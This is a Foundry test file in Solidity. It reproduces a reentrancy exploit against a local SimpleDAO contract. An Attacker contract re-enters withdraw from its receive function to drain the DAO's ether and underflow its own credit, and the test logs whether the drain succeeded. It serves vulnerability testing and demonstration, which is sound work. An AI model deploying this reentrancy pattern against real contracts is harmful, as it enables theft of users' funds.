// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/simple_dao.sol";

contract SimpleDAOReentrancyTest is Test {
    SimpleDAO public dao;
    Attacker public attacker;
    uint public constant INITIAL_ETH = 1 ether;

    function setUp() public {
        dao = new SimpleDAO();
        deal(address(this), INITIAL_ETH);
        dao.donate{value: INITIAL_ETH}(address(this));
    }

    function testReentrancyAttack() public {
        attacker = new Attacker(dao, INITIAL_ETH);
        deal(address(attacker), INITIAL_ETH);
        
        // Pre-attack state snapshot
        console.log("--- BEFORE-Trigger ---");
        uint256 daoBalanceBefore = address(dao).balance;
        uint256 attackerContractBalanceBefore = address(attacker).balance;
        uint256 attackerCreditBefore = dao.queryCredit(address(attacker));
        console.log("DAO ETH balance before attack: ", daoBalanceBefore);
        console.log("Attacker contract ETH balance before attack: ", attackerContractBalanceBefore);
        console.log("Attacker DAO credit before attack: ", attackerCreditBefore);
        console.log("");
        
        // Execute attack
        console.log("--- Trigger Attack ---");
        attacker.attack();
        console.log("");
        
        // Post-attack state snapshot
        console.log("--- AFTER-Trigger ---");
        uint256 daoBalanceAfter = address(dao).balance;
        uint256 attackerContractBalanceAfter = address(attacker).balance;
        uint256 attackerCreditAfter = dao.queryCredit(address(attacker));
        console.log("DAO ETH balance after attack: ", daoBalanceAfter);
        console.log("Attacker contract ETH balance after attack: ", attackerContractBalanceAfter);
        console.log("Attacker DAO credit after attack: ", attackerCreditAfter);
        console.log("");
        
        // Calculate expected underflow value
        uint256 expectedCredit;
        unchecked {
            expectedCredit = type(uint256).max - INITIAL_ETH + 1;
        }
        
        // Vulnerability conditions
        bool drained = (daoBalanceAfter == 0);
        bool doubled = (attackerContractBalanceAfter == 2 * INITIAL_ETH);
        bool underflowed = (attackerCreditAfter == expectedCredit);
        
        // Final verdict
        if (drained && doubled && underflowed) {
            console.log("Vulnerability Exists: Reentrancy attack successfully drained DAO");
        } else {
            console.log("Vulnerability not Exist: One or more reentrancy conditions failed");
            if (!drained) console.log("- DAO not drained (balance: %s)", daoBalanceAfter);
            if (!doubled) console.log("- Attacker ETH incorrect (expected: %s, actual: %s)", 2 * INITIAL_ETH, attackerContractBalanceAfter);
            if (!underflowed) console.log("- Credit underflow failed (expected: %s, actual: %s)", expectedCredit, attackerCreditAfter);
        }
    }

    receive() external payable {}
}

contract Attacker {
    SimpleDAO public dao;
    uint public initialETH;
    uint public count;

    constructor(SimpleDAO _dao, uint _initialETH) {
        dao = _dao;
        initialETH = _initialETH;
    }

    function attack() public payable {
        dao.donate{value: initialETH}(address(this));
        dao.withdraw(initialETH);
    }

    receive() external payable {
        count++;
        if (count < 2) {
            dao.withdraw(initialETH);
        }
    }
}